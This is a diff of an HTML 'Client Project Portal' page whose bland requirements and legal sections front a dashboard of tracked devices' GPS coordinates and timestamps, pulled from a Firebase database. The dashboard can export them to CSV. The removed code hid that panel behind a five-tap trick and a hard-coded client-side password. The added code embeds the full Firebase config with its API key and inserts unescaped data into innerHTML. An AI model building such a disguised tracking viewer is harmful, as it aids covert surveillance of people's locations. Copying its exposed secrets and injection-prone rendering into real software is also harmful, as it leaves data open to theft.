@@ -3,86 +3,71 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Client Project Portal</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Segoe UI', sans-serif;
-    }
     body {
       margin: 0;
+      font-family: Arial, sans-serif;
       background: #f4f4f4;
       color: #333;
-      transition: background 0.5s ease;
     }
     header {
-      background: #fff;
-      padding: 2rem 1rem;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      background: #1a202c;
+      color: #fff;
+      padding: 1rem;
       text-align: center;
     }
-    header h1 {
-      margin: 0;
-      font-size: 1.5rem;
-    }
-    main {
-      padding: 2rem 1rem;
-      max-width: 700px;
+    .container {
+      max-width: 960px;
       margin: auto;
+      padding: 1rem;
     }
-    section {
-      margin-bottom: 2rem;
-    }
-    h2 {
-      margin-bottom: 0.5rem;
-    }
-    .hidden-admin {
-      display: none;
-    }
-    #adminPanel {
-      display: none;
+    .section {
       background: white;
-      padding: 2rem 1rem;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      margin-top: 2rem;
+      margin-bottom: 1rem;
+      padding: 1rem;
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      animation: slideIn 0.5s ease-in-out;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     table {
       width: 100%;
       border-collapse: collapse;
       margin-top: 1rem;
     }
+    table, th, td {
+      border: 1px solid #ccc;
+    }
     th, td {
       padding: 0.5rem;
-      border: 1px solid #ccc;
-      text-align: left;
+      text-align: center;
     }
-    .fade-in {
-      animation: fadeIn 0.8s ease-in-out;
+    .hidden-admin {
+      display: none;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    .admin-panel {
+      margin-top: 2rem;
     }
-    .password-input {
-      display: flex;
-      gap: 10px;
-      margin: 1rem 0;
-    }
-    .password-input input {
-      flex: 1;
-      padding: 0.5rem;
-    }
-    .password-input button {
-      padding: 0.5rem 1rem;
-    }
-    .csv-button {
-      background: #1e88e5;
+    .btn {
+      background: #2b6cb0;
       color: white;
-      border: none;
       padding: 0.5rem 1rem;
-      border-radius: 5px;
+      border: none;
+      border-radius: 4px;
       cursor: pointer;
-      margin: 1rem 0;
+    }
+    .btn:hover {
+      background: #2c5282;
+    }
+    input[type="text"] {
+      padding: 0.5rem;
+      width: 60%;
+      margin-bottom: 1rem;
     }
   </style>
 </head>
@@ -90,30 +75,22 @@
   <header>
     <h1>Client Project Portal</h1>
   </header>
-  <main onclick="tapCount()">
-    <section>
+  <div class="container">
+    <div class="section">
       <h2>Client Requirements</h2>
       <p>All specifications must be approved and timestamped.</p>
-    </section>
-    <section>
+    </div>
+    <div class="section">
       <h2>Terms and Review</h2>
       <p>Final review will be automatically saved and verified upon access.</p>
-    </section>
-    <section>
+    </div>
+    <div class="section">
       <h2>Legal & Compliance</h2>
       <p>Ensure full adherence to documentation agreements.</p>
-    </section>
-    <p style="text-align:center;margin-top:3rem;font-style:italic;color:#888">Tap 5 times anywhere below and scroll to the bottom to access internal review...</p><div id="passwordPrompt" class="hidden-admin fade-in">
-  <div class="password-input">
-    <input type="password" id="adminPassword" placeholder="Enter admin password...">
-    <button onclick="unlockAdmin()">Enter</button>
-  </div>
-</div>
-
-<div id="adminPanel" class="fade-in">
+    </div><div class="admin-panel" id="adminPanel">
   <h2>Admin Dashboard</h2>
-  <input type="text" id="searchInput" placeholder="Search by device or location...">
-  <button class="csv-button" onclick="exportCSV()">Export as CSV</button>
+  <input type="text" id="searchInput" placeholder="Search by device or location..." />
+  <button class="btn" onclick="exportCSV()">Export as CSV</button>
   <p>Daily logs: <span id="dailyCount">0</span></p>
   <table>
     <thead>
@@ -124,77 +101,87 @@
         <th>Timestamp</th>
       </tr>
     </thead>
-    <tbody id="logTable"></tbody>
+    <tbody id="logTable">
+      <tr><td colspan="4">Loading...</td></tr>
+    </tbody>
   </table>
 </div>
 
-  </main>  <script>
-    const dbUrl = "https://gps-d0bab-default-rtdb.firebaseio.com/locations.json";
-    let tapCounter = 0;
+  </div>  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+      authDomain: "gps-d0bab.firebaseapp.com",
+      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+      projectId: "gps-d0bab",
+      storageBucket: "gps-d0bab.appspot.com",
+      messagingSenderId: "810816177909",
+      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+    };
 
-    function tapCount() {
-      tapCounter++;
-      if (tapCounter >= 5) {
-        document.getElementById("passwordPrompt").style.display = "block";
-      }
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const tableBody = document.getElementById("logTable");
+    const dailyCountEl = document.getElementById("dailyCount");
+    const searchInput = document.getElementById("searchInput");
+
+    function updateTable(logs) {
+      const searchTerm = searchInput.value.toLowerCase();
+      let html = "";
+      let dailyCount = 0;
+      const today = new Date().toDateString();
+
+      logs.forEach(log => {
+        const date = new Date(log.timestamp);
+        if (date.toDateString() === today) dailyCount++;
+
+        if (
+          log.device.toLowerCase().includes(searchTerm) ||
+          log.latitude.toLowerCase().includes(searchTerm) ||
+          log.longitude.toLowerCase().includes(searchTerm)
+        ) {
+          html += `
+            <tr>
+              <td>${log.device}</td>
+              <td>${log.latitude}</td>
+              <td>${log.longitude}</td>
+              <td>${date.toLocaleString()}</td>
+            </tr>
+          `;
+        }
+      });
+
+      tableBody.innerHTML = html || '<tr><td colspan="4">No data found</td></tr>';
+      dailyCountEl.textContent = dailyCount;
     }
 
-    function unlockAdmin() {
-      const input = document.getElementById("adminPassword").value;
-      if (input.trim().toUpperCase() === "ASCII") {
-        document.getElementById("adminPanel").style.display = "block";
-        loadData();
-      } else {
-        alert("Incorrect password");
-      }
-    }
-
-    async function loadData() {
-      try {
-        const res = await fetch(dbUrl);
-        const data = await res.json();
-        const logs = Object.values(data || {});
-        const logTable = document.getElementById("logTable");
-        let today = new Date().toDateString();
-        let dailyCount = 0;
-
-        logs.reverse().forEach(entry => {
-          const { device = "Unknown", latitude, longitude, timestamp } = entry;
-          if (!timestamp) return;
-          const dateStr = new Date(timestamp).toLocaleString();
-
-          if (new Date(timestamp).toDateString() === today) dailyCount++;
-
-          const row = `<tr>
-            <td>${device}</td>
-            <td>${latitude ?? "-"}</td>
-            <td>${longitude ?? "-"}</td>
-            <td>${dateStr}</td>
-          </tr>`;
-          logTable.innerHTML += row;
+    function fetchLogs() {
+      db.ref("locations").on("value", (snapshot) => {
+        const logs = [];
+        snapshot.forEach(child => {
+          logs.push(child.val());
         });
-
-        document.getElementById("dailyCount").innerText = dailyCount;
-      } catch (e) {
-        console.error("Failed to fetch logs:", e);
-      }
+        updateTable(logs);
+      });
     }
 
     function exportCSV() {
       let csv = "Device,Latitude,Longitude,Timestamp\n";
-      document.querySelectorAll("#logTable tr").forEach(row => {
+      const rows = tableBody.querySelectorAll("tr");
+      rows.forEach(row => {
         const cols = row.querySelectorAll("td");
-        const line = Array.from(cols).map(td => td.innerText).join(",");
-        csv += line + "\n";
+        if (cols.length === 4) {
+          csv += `${cols[0].textContent},${cols[1].textContent},${cols[2].textContent},${cols[3].textContent}\n`;
+        }
       });
-
       const blob = new Blob([csv], { type: "text/csv" });
-      const url = URL.createObjectURL(blob);
       const link = document.createElement("a");
-      link.href = url;
-      link.download = "gps_logs.csv";
+      link.href = URL.createObjectURL(blob);
+      link.download = "logs.csv";
       link.click();
-      URL.revokeObjectURL(url);
     }
+
+    searchInput.addEventListener("input", fetchLogs);
+    window.onload = fetchLogs;
   </script></body>
-</html>
+  </html>
